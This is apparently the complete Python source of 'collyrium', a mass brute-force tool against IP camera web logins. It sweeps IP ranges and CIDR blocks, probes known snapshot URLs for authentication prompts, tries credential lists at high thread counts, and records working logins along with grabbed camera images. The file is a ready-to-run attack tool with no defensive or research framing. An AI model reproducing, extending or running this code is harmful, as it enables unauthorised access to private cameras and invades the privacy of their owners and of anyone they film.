import argparse
import itertools
import os
import signal
import socket
import sys
import threading
import time
import ipaddress
import requests
from urllib.parse import urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed, wait, FIRST_COMPLETED

SNAPSHOT_PATHS = [
    "/tmpfs/snap.jpg",
    "/tmpfs/auto.jpg",
    "/ISAPI/Streaming/channels/101/picture",
    "/Streaming/channels/101/picture",
    "/cgi-bin/snapshot.cgi",
    "/snap.jpg",
    "/snapshot.jpg",
    "/axis-cgi/jpg/image.cgi",
    "/cgi-bin/viewer/snapshot.jpg",
    "/cgi-bin/viewer/video.jpg",
    "/image/jpeg.cgi",
    "/img/snapshot.cgi",
    "/jpg/image.jpg",
    "/cgi-bin/video.jpg",
    "/cgi-bin/view.cgi",
    "/video.cgi",
    "/image/1.jpg",
    "/image.jpg",
    "/cgi/jpg/image.cgi",
    "/stream.jpg",
    "/stream/snapshot.jpg",
    "/stream/current.jpg",
    "/control/faststream.jpg",
    "/record/current.jpg",
    "/image",
]

USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
HTTP_TIMEOUT = 2
SOCKET_TIMEOUT = 1

PATH_PARALLEL_WORKERS = 1
CRED_PARALLEL_WORKERS = 1
active_brute_limiter = None 

stop_event = threading.Event()
interrupted_by_user = False
progress_lock = threading.Lock()
ip_port_map = {}
ip_completed = {}
ip_lock = threading.Lock()
total_unique_ips = 0
scanned_ips = 0
last_progress_time = 0.0
suppress_final_progress = False
thread_local = threading.local()

def get_session():
    if not hasattr(thread_local, "session"):
        s = requests.Session()
        s.headers.update({'User-Agent': USER_AGENT})
        s.keep_alive = False 
        s.adapters.DEFAULT_RETRIES = 1  
        thread_local.session = s
    return thread_local.session

def is_port_open(ip, port, timeout=SOCKET_TIMEOUT):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((ip, port))
        sock.close()
        return result == 0
    except:
        return False

def is_valid_image_and_ext(data, content_type):
    if len(data) < 10:
        return None
    head = data[:512].lower()
    if any(tag in head for tag in [b'<html', b'<?xml', b'<!doctype', b'<soap', b'{"', b'[{', b'text/html']):
        return None
    if 'multipart' in content_type.lower():
        return None
    if data.startswith(b'\xff\xd8\xff'):
        return 'jpg'
    if data.startswith(b'\x89PNG\r\n\x1a\n'):
        return 'png'
    ct = content_type.lower()
    if 'jpeg' in ct or 'jpg' in ct:
        return 'jpg'
    if 'png' in ct:
        return 'png'
    if not any(c in head for c in [b'<', b'{', b'[', b'<?']):
        return 'jpg'
    return None

def log_error(msg):
    with progress_lock:
        sys.stderr.write(f"[!] {msg}\n")

def load_list(filepath, allow_empty=False):
    if not os.path.isfile(filepath):
        log_error(f"{os.path.basename(filepath)} Not found!")
        sys.exit(1)
    with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
        lines = [line.strip() for line in f if line.strip() and not line.startswith('#')]
    if not lines and not allow_empty:
        log_error(f"{os.path.basename(filepath)} Is empty!")
        sys.exit(1)
    return lines

def load_ports(filepath):
    raw = load_list(filepath)
    ports = []
    for p in raw:
        if not p.isdigit():
            log_error("ports.cfg Contains non-numeric port!")
            sys.exit(1)
        port = int(p)
        if not (1 <= port <= 65535):
            log_error("ports.cfg Contains port out of range (1-65535)!")
            sys.exit(1)
        ports.append(port)
    return ports

def load_creds(filepath):
    if not os.path.isfile(filepath):
        log_error(f"{os.path.basename(filepath)} Not found!")
        sys.exit(1)
    with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
        creds = []
        for line in f:
            line = line.strip()
            if not line or line.startswith('#'):
                continue
            if ':' in line:
                parts = line.split(':', 1)
                login = parts[0].strip()
                password = parts[1].strip() if len(parts) > 1 else ''
                creds.append((login, password))
    if not creds:
        log_error(f"{os.path.basename(filepath)} Is empty!")
        sys.exit(1)
    return creds

def format_progress(scanned, found, total_ips, width=48):
    percent = int((scanned / total_ips) * 100) if total_ips else 0
    filled = int((scanned / total_ips) * width) if total_ips else 0
    bar = '█' * filled + '-' * (width - filled)
    return f"[=] Scanned: {scanned} | Found: {found} [{bar}] {percent}%"

def safe_print(*args, **kwargs):
    with progress_lock:
        print(*args, **kwargs)

def print_progress_once(scanned, found, total_ips):
    global last_progress_time
    with progress_lock:
        sys.stdout.write('\r' + format_progress(scanned, found, total_ips))
        sys.stdout.flush()
        last_progress_time = time.time()

def check_path(ip, port, path):
    if stop_event.is_set():
        return None, None, False
    url_base = f"http://{ip}:{port}"
    session = get_session()
    try:
        url = urljoin(url_base, path)
        resp = session.get(url, timeout=HTTP_TIMEOUT, allow_redirects=True, stream=False)
        if resp.status_code == 401:
            auth_header = ''
            for k, v in resp.headers.items():
                if k.lower() == 'www-authenticate':
                    auth_header = v
                    break
            auth_type = 'digest' if 'digest' in auth_header.lower() else 'basic'
            return auth_type, path, True
        return None, None, False
    except:
        return None, None, False

def try_cred(ip, port, auth_type, auth_path, login, password):
    if stop_event.is_set():
        return None, None, None, None, False
    url_base = f"http://{ip}:{port}"
    session = get_session()
    url_auth = urljoin(url_base, auth_path)
    try:
        if auth_type == 'digest':
            resp = session.get(url_auth, auth=requests.auth.HTTPDigestAuth(login, password), 
                             timeout=HTTP_TIMEOUT, stream=False)
        else:
            resp = session.get(url_auth, auth=(login, password), 
                             timeout=HTTP_TIMEOUT, stream=False)
        if resp.status_code == 200 and len(resp.content) > 50:
            return login, password, resp.content, resp.headers.get('Content-Type', ''), True
        return None, None, None, None, False
    except:
        return None, None, None, None, False

def process_target(ip, port, creds, output_path):
    if stop_event.is_set():
        return False
    if not is_port_open(ip, port):
        return False

    auth_type, auth_path = None, None
    
    with active_brute_limiter:
        with ThreadPoolExecutor(max_workers=PATH_PARALLEL_WORKERS) as path_pool:
            path_futs = [path_pool.submit(check_path, ip, port, p) for p in SNAPSHOT_PATHS]
            for fut in as_completed(path_futs):
                at, ap, success = fut.result()
                if success:
                    auth_type, auth_path = at, ap
                    break
        
        if not auth_type:
            return False

        with ThreadPoolExecutor(max_workers=CRED_PARALLEL_WORKERS) as cred_pool:
            cred_futs = [cred_pool.submit(try_cred, ip, port, auth_type, auth_path, l, p) for l, p in creds]
            for fut in as_completed(cred_futs):
                login, password, data, content_type, success = fut.result()
                if success:
                    cred_line = f"{login}:{password}@{ip}:{port}"
                    with open(os.path.join(output_path, "results.txt"), "a", encoding='utf-8') as f:
                        f.write(cred_line + "\n")
                    
                    ext = is_valid_image_and_ext(data, content_type)
                    if ext:
                        safe_filename = f"{login}_{password}_{ip}_{port}".replace(":", "_").replace("/", "_").replace("\\", "_")
                        try:
                            with open(os.path.join(output_path, "snapshots", f"{safe_filename}.{ext}"), "wb") as f:
                                f.write(data)
                        except: pass
                    return True
    return False

def signal_handler(sig, frame):
    global interrupted_by_user, suppress_final_progress
    now = time.time()
    if now - last_progress_time < 0.6:
        suppress_final_progress = True
    safe_print("\n[*] Interrupted by user! Stopping...")
    interrupted_by_user = True
    stop_event.set()

def iter_targets(ip_port_map):
    for ip, ports in ip_port_map.items():
        for port in ports:
            yield ip, port

def main():
    global ip_port_map, ip_completed, total_unique_ips, scanned_ips, suppress_final_progress
    global PATH_PARALLEL_WORKERS, CRED_PARALLEL_WORKERS, active_brute_limiter
    
    parser = argparse.ArgumentParser(add_help=False)
    parser.add_argument('-i', type=str)
    parser.add_argument('-o', type=str)
    parser.add_argument('-t', type=int, default=512)
    parser.add_argument('-?', action='store_true')
    
    if len(sys.argv) == 1 or '-?' in sys.argv:
        print("[?] collyrium - IP Cameras Web authentication bruteforce tool")
        print("-i [Path to the input file (Supports IP/IP:Port/Ranges/CIDR)]")
        print("-o [Path to the output folder]")
        print("-t [Threads number (Default=512)]")
        print("-? [Help]")
        return
    
    args = parser.parse_args()
    
    if not args.i or not args.o:
        print("[?] collyrium - IP Cameras Web authentication bruteforce tool")
        print("-i [Path to the input file (Supports IP/IP:Port/Ranges/CIDR)]")
        print("-o [Path to the output folder]")
        print("-t [Threads number (Default=512)]")
        print("-? [Help]")
        return

    total_threads = max(1, args.t)
    max_active_cameras = max(1, int(total_threads * 0.3 / 10))
    if max_active_cameras < 1: max_active_cameras = 1
    active_brute_limiter = threading.Semaphore(max_active_cameras)
    
    PATH_PARALLEL_WORKERS = max(4, int((total_threads * 0.2) / max_active_cameras))
    CRED_PARALLEL_WORKERS = max(8, int((total_threads * 0.3) / max_active_cameras))

    input_path = args.i
    output_path = args.o
    threads = total_threads

    if not os.path.isfile(input_path):
        log_error(f"Input file: {input_path} not found!")
        return

    if getattr(sys, 'frozen', False):
        base_path = os.path.dirname(sys.executable)
    else:
        base_path = os.path.dirname(os.path.abspath(__file__))
        
    config_dir = os.path.join(base_path, "config")
    creds = load_creds(os.path.join(config_dir, "creds.cfg"))
    ports = load_ports(os.path.join(config_dir, "ports.cfg"))

    with open(input_path, 'r', encoding='utf-8', errors='ignore') as f:
        raw_lines = f.readlines()

    unique_ips = set()
    for line in raw_lines:
        line = line.strip()
        if not line or line.startswith('#'): continue
        try:
            if '/' in line:
                net = ipaddress.ip_network(line, strict=False)
                for ip_obj in net.hosts():
                    ip_s = str(ip_obj)
                    unique_ips.add(ip_s)
                    ip_port_map.setdefault(ip_s, set()).update(ports)
            elif '-' in line:
                s, e = line.split('-')
                start, end = ipaddress.IPv4Address(s.strip()), ipaddress.IPv4Address(e.strip())
                curr = start
                while curr <= end:
                    ip_s = str(curr)
                    unique_ips.add(ip_s)
                    ip_port_map.setdefault(ip_s, set()).update(ports)
                    curr += 1
            elif ':' in line:
                ip_p, port_p = line.split(':')
                unique_ips.add(ip_p)
                ip_port_map.setdefault(ip_p, set()).add(int(port_p))
            else:
                ipaddress.IPv4Address(line)
                unique_ips.add(line)
                ip_port_map.setdefault(line, set()).update(ports)
        except: continue

    total_unique_ips = len(unique_ips)
    if total_unique_ips == 0:
        log_error("No valid targets!")
        return

    os.makedirs(output_path, exist_ok=True)
    os.makedirs(os.path.join(output_path, "snapshots"), exist_ok=True)

    safe_print("[~] collyrium")
    safe_print(f"[+] Input: {input_path}")
    safe_print(f"[+] Output: {output_path}")
    safe_print(f"[+] Threads: {threads}")
    safe_print(f"[+] Credentials - {len(creds)}")
    safe_print(f"[+] Hosts: {total_unique_ips}")
    print()

    signal.signal(signal.SIGINT, signal_handler)
    if os.name == 'nt':
        signal.signal(signal.SIGBREAK, signal_handler)

    target_iter = iter_targets(ip_port_map)
    found = 0
    running = set()
    fut_to_target = {}
    last_update = 0.0

    with ThreadPoolExecutor(max_workers=threads) as executor:
        def submit_next():
            try:
                ip, port = next(target_iter)
                fut = executor.submit(process_target, ip, port, creds, output_path)
                running.add(fut)
                fut_to_target[fut] = (ip, port)
                return True
            except StopIteration: return False

        for _ in range(min(threads * 2, total_unique_ips)):
            if not submit_next(): break

        while running and not stop_event.is_set():
            done, _ = wait(running, timeout=0.05, return_when=FIRST_COMPLETED)
            for fut in done:
                running.discard(fut)
                ip_port = fut_to_target.pop(fut, (None, None))
                try:
                    if fut.result(): found += 1
                except: pass
                if ip_port[0]:
                    with ip_lock:
                        ip_completed.setdefault(ip_port[0], set()).add(ip_port[1])
                        if ip_completed[ip_port[0]] == ip_port_map[ip_port[0]]:
                            scanned_ips += 1
                submit_next()
            
            now = time.time()
            if now - last_update >= 0.1 and not interrupted_by_user:
                print_progress_once(scanned_ips, found, total_unique_ips)
                last_update = now

    if not suppress_final_progress:
        safe_print('\r' + format_progress(scanned_ips, found, total_unique_ips), end='\n', flush=True)
    
    if not interrupted_by_user:
        safe_print("[*] Scanning complete! Stopping...")
    
    end_time = time.strftime("%d.%m.%Y %H:%M:%S", time.localtime())
    with open(os.path.join(output_path, "results.txt"), "a", encoding='utf-8') as f:
        f.write(f"\n# Scan finished: {end_time}\n")
        f.write(f"# Hosts found: {found}\n")

if __name__ == "__main__":
    main()
